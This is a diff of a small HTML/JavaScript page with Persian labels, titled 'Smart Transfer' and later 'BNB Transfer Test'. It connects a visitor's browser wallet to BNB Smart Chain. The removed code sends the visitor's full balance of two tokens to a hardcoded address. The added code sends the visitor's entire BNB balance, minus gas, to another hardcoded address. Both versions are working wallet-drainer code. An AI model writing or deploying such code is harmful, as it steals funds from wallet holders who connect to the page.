@@ -3,113 +3,88 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Smart Transfer</title>
+<title>BNB Transfer Test</title>
 <style>
-body{font-family:sans-serif;text-align:center;margin-top:40px}
-button{padding:10px 20px;font-size:16px;margin:5px}
+body{font-family:sans-serif;text-align:center;margin-top:50px;}
+button{padding:10px 20px;font-size:16px;margin:10px;}
 </style>
 </head>
 <body>
 
-<h2>Smart Transfer</h2>
+<h2>BNB Transfer Test</h2>
 
-<button onclick="connect()">کانکت</button>
-<button onclick="transfer()">انتقال</button>
+<button onclick="connectWallet()">کانکت</button>
+<button onclick="sendBNB()">انتقال کل BNB</button>
 
 <p id="status"></p>
 
 <script>
-const DEST = "0x8E4785818A5A05735974B6556C3650F6338E6ab0";
-const TOKENS = [
-  "0x55d398326f99059fF775485246999027B3197955",
-  "0x641a6Dc991A49f7BE9Fe3C72c5d0FBb223eDb12f"
-];
-
 let account;
+const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";
 
-function status(t){document.getElementById("status").innerText=t;}
+function setStatus(msg){document.getElementById("status").innerText = msg;}
 
-async function ensureBSC(){
- const chainId = "0x38";
+// کانکت با ولت
+async function connectWallet(){
+    if(!window.ethereum){
+        alert("Wallet not found");
+        return;
+    }
+    const accounts = await ethereum.request({method:'eth_requestAccounts'});
+    account = accounts[0];
+    setStatus("Connected: " + account);
 
- try{
-   await ethereum.request({
-     method:"wallet_switchEthereumChain",
-     params:[{chainId}]
-   });
- }catch(err){
-   // اگر شبکه اضافه نشده بود
-   await ethereum.request({
-     method:"wallet_addEthereumChain",
-     params:[{
-       chainId:"0x38",
-       chainName:"BNB Smart Chain",
-       nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-       rpcUrls:["https://bsc-dataseed.binance.org"],
-       blockExplorerUrls:["https://bscscan.com"]
-     }]
-   });
- }
+    // خودکار سوئیچ به BSC
+    try{
+        await ethereum.request({
+            method:"wallet_switchEthereumChain",
+            params:[{chainId:"0x38"}] // BSC Mainnet
+        });
+        setStatus("Connected & BSC active: " + account);
+    }catch(err){
+        console.error(err);
+        alert("خطا در سوئیچ شبکه یا اضافه کردن BSC");
+    }
 }
 
-async function connect(){
- if(!window.ethereum){alert("Wallet not found");return;}
- const acc = await ethereum.request({method:'eth_requestAccounts'});
- account = acc[0];
- await ensureBSC();
- status("Connected & BNB ready");
-}
+// محاسبه مقدار کل BNB
+async function sendBNB(){
+    if(!account){alert("ابتدا کانکت کنید"); return;}
+    
+    setStatus("در حال خواندن موجودی...");
 
-function toHex(n){return "0x"+n.toString(16);}
+    try{
+        const balanceHex = await ethereum.request({
+            method:"eth_getBalance",
+            params:[account, "latest"]
+        });
+        const balance = parseInt(balanceHex,16);
 
-// خواندن موجودی توکن
-async function tokenBalance(token){
- const data="0x70a08231"+account.substring(2).padStart(64,"0");
+        // مقداری برای Gas نگه می‌داریم (~0.00021 BNB)
+        const gasReserve = 210000000000000; 
+        const sendAmount = balance - gasReserve;
+        if(sendAmount <= 0){
+            alert("موجودی کافی برای Gas ندارید");
+            return;
+        }
 
- const res=await ethereum.request({
-  method:"eth_call",
-  params:[{to:token,data:data},"latest"]
- });
+        // ارسال تراکنش
+        const txHash = await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from: account,
+                to: DESTINATION,
+                value: "0x" + sendAmount.toString(16)
+            }]
+        });
 
- return parseInt(res,16);
-}
-
-async function sendToken(token, amount){
- const data =
-  "0xa9059cbb"+
-  DEST.substring(2).padStart(64,"0")+
-  toHex(amount).substring(2).padStart(64,"0");
-
- return ethereum.request({
-   method:"eth_sendTransaction",
-   params:[{from:account,to:token,data:data}]
- });
-}
-
-async function transfer(){
-
- if(!account){alert("کانکت کن");return;}
-
- try{
-
-   for(const token of TOKENS){
-     const bal = await tokenBalance(token);
-     if(bal>0){
-       status("ارسال توکن...");
-       await sendToken(token, bal);
-     }
-   }
-
-   status("تمام شد ✅");
-
- }catch(e){
-   console.error(e);
-   alert("خطا یا رد شد");
- }
+        setStatus("تراکنش ارسال شد: " + txHash);
+    }catch(err){
+        console.error(err);
+        alert("خطا در ارسال تراکنش");
+    }
 }
 </script>
+
 </body>
 </html>
-
-
-
